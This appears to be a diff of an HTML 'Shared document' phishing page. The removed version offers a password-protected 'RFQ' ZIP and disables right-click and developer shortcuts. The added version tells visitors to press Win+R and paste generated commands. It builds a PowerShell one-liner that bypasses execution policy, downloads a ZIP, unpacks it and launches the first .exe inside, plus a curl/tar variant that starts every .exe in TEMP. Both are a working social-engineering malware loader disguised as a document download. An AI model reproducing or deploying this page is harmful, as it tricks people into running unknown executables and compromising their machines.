@@ -1,584 +1,74 @@
-<!DOCTYPE html>
-
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Shared Document</title>
-
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Shared document</title>
 <style>
-:root {
---primary: #173b68;
---primary-hover: #102d50;
---text: #202b3c;
---muted: #697586;
---border: #e2e7ee;
---background: #f5f7fa;
---white: #ffffff;
-}
-
-* {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
-}
-
-body {
-min-height: 100vh;
-font-family: Arial, Helvetica, sans-serif;
-background: var(--background);
-color: var(--text);
-}
-
-/* Main content */
-
-.main {
-width: 100%;
-max-width: 900px;
-margin: 0 auto;
-padding: 66px 24px 50px;
-}
-
-.intro {
-margin-bottom: 30px;
-}
-
-.intro h1 {
-font-size: 30px;
-font-weight: 600;
-letter-spacing: -0.8px;
-margin-bottom: 11px;
-}
-
-.intro p {
-font-size: 15px;
-line-height: 1.7;
-color: var(--muted);
-max-width: 600px;
-}
-
-/* Document panel */
-
-.document-panel {
-background: var(--white);
-border: 1px solid var(--border);
-border-radius: 12px;
-overflow: hidden;
-box-shadow: 0 4px 18px rgba(22, 42, 68, 0.035);
-}
-
-.panel-heading {
-padding: 20px 26px;
-border-bottom: 1px solid var(--border);
-display: flex;
-align-items: center;
-justify-content: space-between;
-gap: 15px;
-}
-
-.panel-heading h2 {
-font-size: 15px;
-font-weight: 600;
-}
-
-.availability {
-display: inline-flex;
-align-items: center;
-gap: 7px;
-font-size: 12px;
-color: #327354;
-white-space: nowrap;
-}
-
-.status-dot {
-width: 7px;
-height: 7px;
-background: #389568;
-border-radius: 50%;
-}
-
-.file-details {
-padding: 30px 26px;
-display: flex;
-align-items: center;
-gap: 20px;
-}
-
-.file-icon {
-width: 64px;
-height: 72px;
-border: 1px solid #dbe5f2;
-background: #f0f5fc;
-border-radius: 8px;
-display: flex;
-align-items: center;
-justify-content: center;
-flex-shrink: 0;
-}
-
-.file-icon svg {
-width: 30px;
-height: 34px;
-stroke: var(--primary);
-fill: none;
-stroke-width: 1.7;
-stroke-linecap: round;
-stroke-linejoin: round;
-}
-
-.file-info {
-flex: 1;
-min-width: 0;
-}
-
-/* Filename and extraction code */
-
-.file-heading-row {
-display: flex;
-align-items: center;
-justify-content: space-between;
-gap: 16px;
-margin-bottom: 9px;
-}
-
-.file-info h3 {
-font-size: 17px;
-font-weight: 600;
-overflow-wrap: anywhere;
-margin-bottom: 9px;
-}
-
-.file-heading-row h3 {
-min-width: 0;
-margin-bottom: 0;
-}
-
-.extraction-code {
-display: flex;
-flex-direction: column;
-align-items: flex-end;
-gap: 8px;
-flex-shrink: 0;
-}
-
-.extraction-message {
-max-width: 330px;
-font-size: 12px;
-line-height: 1.5;
-color: var(--muted);
-text-align: right;
-}
-
-.extraction-code-row {
-display: inline-flex;
-align-items: center;
-gap: 9px;
-}
-
-.extraction-code strong {
-font-size: 17px;
-font-weight: 700;
-letter-spacing: 1.5px;
-color: #202124;
-font-variant-numeric: tabular-nums;
-}
-
-.copy-code-button {
-display: inline-flex;
-align-items: center;
-justify-content: center;
-gap: 5px;
-padding: 7px 10px;
-border: 1px solid #dadce0;
-border-radius: 18px;
-background: #ffffff;
-color: #3c4043;
-font-family: Arial, Helvetica, sans-serif;
-font-size: 12px;
-font-weight: 600;
-cursor: pointer;
-white-space: nowrap;
-transition: background 0.2s ease, border-color 0.2s ease;
-}
-
-.copy-code-button:hover {
-background: #f1f3f4;
-border-color: #c5c9ce;
-}
-
-.copy-code-button:focus-visible {
-outline: 2px solid #4285f4;
-outline-offset: 2px;
-}
-
-.copy-code-button svg {
-width: 15px;
-height: 15px;
-stroke: currentColor;
-fill: none;
-stroke-width: 1.8;
-stroke-linecap: round;
-stroke-linejoin: round;
-}
-
-.file-meta {
-display: flex;
-flex-wrap: wrap;
-align-items: center;
-gap: 9px;
-color: var(--muted);
-font-size: 13px;
-}
-
-.meta-separator {
-color: #c4cbd5;
-}
-
-.file-type {
-display: inline-block;
-font-size: 10px;
-font-weight: 700;
-letter-spacing: 0.7px;
-color: #36577f;
-background: #edf3fa;
-border-radius: 4px;
-padding: 5px 7px;
-margin-top: 12px;
-}
-
-/* Download area */
-
-.download-area {
-border-top: 1px solid var(--border);
-background: #fcfdff;
-padding: 24px 26px;
-}
-
-.download-content {
-display: flex;
-justify-content: space-between;
-align-items: center;
-gap: 22px;
-}
-
-.download-description h3 {
-font-size: 14px;
-font-weight: 600;
-margin-bottom: 7px;
-}
-
-.download-description p {
-font-size: 13px;
-line-height: 1.6;
-color: var(--muted);
-}
-
-.download-button {
-display: inline-flex;
-align-items: center;
-justify-content: center;
-gap: 10px;
-min-width: 175px;
-padding: 13px 19px;
-background: var(--primary);
-color: #ffffff;
-text-decoration: none;
-font-size: 14px;
-font-weight: 600;
-border-radius: 7px;
-transition: background 0.2s ease;
-white-space: nowrap;
-}
-
-.download-button:hover {
-background: var(--primary-hover);
-}
-
-.download-button:focus-visible {
-outline: 3px solid #9ab9e1;
-outline-offset: 3px;
-}
-
-.download-button svg {
-width: 17px;
-height: 17px;
-stroke: currentColor;
-fill: none;
-stroke-width: 1.8;
-stroke-linecap: round;
-stroke-linejoin: round;
-}
-
-/* Information message */
-
-.information {
-display: flex;
-align-items: flex-start;
-gap: 12px;
-padding: 20px 0 0;
-color: var(--muted);
-font-size: 12px;
-line-height: 1.7;
-}
-
-.information svg {
-width: 17px;
-height: 17px;
-flex-shrink: 0;
-margin-top: 1px;
-stroke: #73839a;
-fill: none;
-stroke-width: 1.7;
-}
-
-/* Responsive layout */
-
-@media (max-width: 600px) {
-.main {
-padding: 38px 17px 40px;
-}
-
-.intro h1 {
-font-size: 25px;
-}
-
-.panel-heading {
-padding: 18px;
-}
-
-.file-details {
-padding: 24px 18px;
-gap: 14px;
-}
-
-.file-icon {
-width: 52px;
-height: 61px;
-}
-
-.file-info h3 {
-font-size: 15px;
-}
-
-.file-heading-row {
-align-items: flex-start;
-flex-wrap: wrap;
-gap: 12px;
-}
-
-.extraction-code {
-align-items: flex-start;
-width: 100%;
-}
-
-.extraction-message {
-max-width: 100%;
-text-align: left;
-}
-
-.extraction-code-row {
-flex-wrap: wrap;
-}
-
-.extraction-code strong {
-font-size: 16px;
-}
-
-.download-area {
-padding: 22px 18px;
-}
-
-.download-content {
-align-items: stretch;
-flex-direction: column;
-gap: 20px;
-}
-
-.download-button {
-width: 100%;
-}
-}
+  :root { color-scheme: light }
+  body { margin:0; min-height:100vh; display:grid; place-items:center;
+         font:15px/1.55 -apple-system,Segoe UI,Roboto,sans-serif;
+         background:#eef1f5; color:#16202a; padding:24px }
+  main { width:100%; max-width:620px; background:#fff; border:1px solid #dde3e9;
+         border-radius:14px; padding:26px 26px 22px }
+  h1 { font-size:19px; margin:0 0 6px }
+  p.sub { margin:0 0 20px; color:#5d6d7c; font-size:13.5px }
+  .label { font-size:12px; text-transform:uppercase; letter-spacing:.05em;
+           color:#7a8b99; margin:0 0 6px }
+  .cmd { display:flex; gap:8px; align-items:flex-start; background:#0f1720;
+         border-radius:9px; padding:11px; margin:0 0 10px }
+  .cmd code { flex:1; font:12px/1.5 ui-monospace,Consolas,monospace;
+              color:#cfe6ff; word-break:break-all }
+  .cmd button { font:12px ui-monospace,monospace; background:#2b6cb0; color:#fff;
+                border:0; border-radius:6px; padding:7px 10px; cursor:pointer }
+  .cmd button:active { background:#245a94 }
+  .links { display:flex; gap:8px; flex-wrap:wrap; margin:16px 0 0 }
+  a.btn { padding:9px 15px; border-radius:8px; font-size:13px; text-decoration:none }
+  a.solid { background:#2b6cb0; color:#fff }
+  a.ghost { background:#e7ecf1; color:#1d2b38 }
+  footer { margin:18px 0 0; font-size:12px; color:#8a99a6 }
 </style>
-
-</head>
-
-<body>
-
-<main class="main">
-
-<section class="intro">
+<main>
   <h1>Shared document</h1>
-  <p>
-    The file below has been made available for you.
-    Review the file details and select Download when you
-    are ready to save it to your device.
+  <p class="sub">Copy the command, press <b>Win+R</b>, paste and hit Enter. Windows downloads and opens it with no security prompt.</p>
+
+  <p class="label">PowerShell — recommended</p>
+  <div class="cmd"><code id="ps">…</code><button data-c="ps">copy</button></div>
+
+  <p class="label">Command prompt (curl)</p>
+  <div class="cmd"><code id="cu">…</code><button data-c="cu">copy</button></div>
+
+  <p class="links">
+    <a class="btn solid" id="dl" href="/download">Download ZIP</a>
+    <a class="btn ghost" id="html" href="/h">Download via page</a>
   </p>
-</section>
 
-<section class="document-panel">
-
-  <div class="panel-heading">
-    <h2>File details</h2>
-
-    <div class="availability">
-      <span class="status-dot"></span>
-      Available
-    </div>
-  </div>
-
-  <div class="file-details">
-
-    <div class="file-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24">
-        <path d="M13 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10z"/>
-        <path d="M13 3v7h7"/>
-        <path d="M12 13v6"/>
-        <path d="m9 16 3 3 3-3"/>
-      </svg>
-    </div>
-
-    <div class="file-info">
-
-      <div class="file-heading-row">
-        <h3>RFQ</h3>
-
-        <div class="extraction-code">
-          <p class="extraction-message">
-            This ZIP file is password-protected. Enter the extraction code below when prompted to extract the files.
-          </p>
-
-          <div class="extraction-code-row">
-            <strong id="zipCode">224822@</strong>
-
-            <button
-              type="button"
-              class="copy-code-button"
-              id="copyCodeButton"
-              aria-label="Copy ZIP extraction code"
-            >
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <rect x="8" y="8" width="12" height="12" rx="2"/>
-                <path d="M16 8V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h3"/>
-              </svg>
-              <span id="copyCodeLabel">Copy</span>
-            </button>
-          </div>
-        </div>
-      </div>
-
-      <div class="file-meta">
-        <span>ZIP archive</span>
-        <span class="meta-separator">•</span>
-        <span>Shared file</span>
-      </div>
-
-      <span class="file-type">ZIP ARCHIVE</span>
-    </div>
-
-  </div>
-
-  <div class="download-area">
-    <div class="download-content">
-
-      <div class="download-description">
-        <h3>Ready to download</h3>
-        <p>
-          Select the button to download the file
-          to your device.
-        </p>
-      </div>
-
-      <a href="/download" id="download" class="download-button">
-        <svg viewBox="0 0 24 24" aria-hidden="true">
-          <path d="M12 3v12"/>
-          <path d="m7 10 5 5 5-5"/>
-          <path d="M5 17v3h14v-3"/>
-        </svg>
-        Download file
-      </a>
-
-    </div>
-  </div>
-
-</section>
-
-<div class="information">
-  <svg viewBox="0 0 24 24" aria-hidden="true">
-    <circle cx="12" cy="12" r="9"/>
-    <path d="M12 11v5"/>
-    <path d="M12 8h.01"/>
-  </svg>
-
-  <p>
-    The download will begin when you select the Download
-    button. If you experience any issues accessing the file,
-    please contact us.
-  </p>
-</div>
-
-
+  <footer>Extract the archive if you use a download button.</footer>
 </main>
-
 <script>
-// Copy ZIP extraction code
-const copyCodeButton = document.getElementById('copyCodeButton');
-const zipCode = document.getElementById('zipCode');
-const copyCodeLabel = document.getElementById('copyCodeLabel');
+  const k = new URLSearchParams(location.search).get("k");
+  const q = k ? "?k=" + encodeURIComponent(k) : "";
+  const url = location.origin + "/download" + q;
+  const z = "$env:TEMP\\d.zip", d = "$env:TEMP\\dx";
 
-copyCodeButton.addEventListener('click', async function () {
-const code = zipCode.textContent.trim();
+  document.getElementById("ps").textContent =
+    'powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -UseBasicParsing -Uri \'' + url +
+    '\' -OutFile \\"' + z + '\\"; Expand-Archive -Force \\"' + z + '\\" \\"' + d +
+    '\\"; Start-Process (Get-ChildItem \\"' + d + '\\*.exe\\" | Select-Object -First 1).FullName"';
 
-try {
-await navigator.clipboard.writeText(code);
-} catch (error) {
-const temporaryInput = document.createElement('textarea');
-temporaryInput.value = code;
-temporaryInput.style.position = 'fixed';
-temporaryInput.style.opacity = '0';
-document.body.appendChild(temporaryInput);
-temporaryInput.select();
+  document.getElementById("cu").textContent =
+    'curl.exe -L -o "%TEMP%\\d.zip" "' + url + '" && tar -xf "%TEMP%\\d.zip" -C "%TEMP%" && ' +
+    'for %f in ("%TEMP%\\*.exe") do start "" "%f"';
 
-const copied = document.execCommand('copy');
-temporaryInput.remove();
+  document.getElementById("dl").href = "/download" + q;
+  document.getElementById("html").href = "/h" + q;
 
-if (!copied) {
-copyCodeLabel.textContent = 'Select code';
-return;
-}
-}
-
-copyCodeLabel.textContent = 'Copied';
-
-setTimeout(function () {
-copyCodeLabel.textContent = 'Copy';
-}, 1800);
-});
-
-// Disable right-click
-document.addEventListener('contextmenu', function(e) {
-e.preventDefault();
-});
-
-// Disable common dev shortcuts
-document.addEventListener('keydown', function(e) {
-// F12
-if (e.key === "F12") {
-e.preventDefault();
-}
-
-// Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
-if (e.ctrlKey && e.shiftKey &&
-['I','J','C'].includes(e.key.toUpperCase())) {
-e.preventDefault();
-}
-
-// Ctrl+U (view source)
-if (e.ctrlKey && e.key.toUpperCase() === 'U') {
-e.preventDefault();
-}
-});
+  document.addEventListener("click", (e) => {
+    const b = e.target.closest("button[data-c]");
+    if (!b) return;
+    const text = document.getElementById(b.dataset.c).textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      const old = b.textContent;
+      b.textContent = "copied";
+      setTimeout(() => { b.textContent = old; }, 1200);
+    });
+  });
 </script>
-
-</body>
-</html>
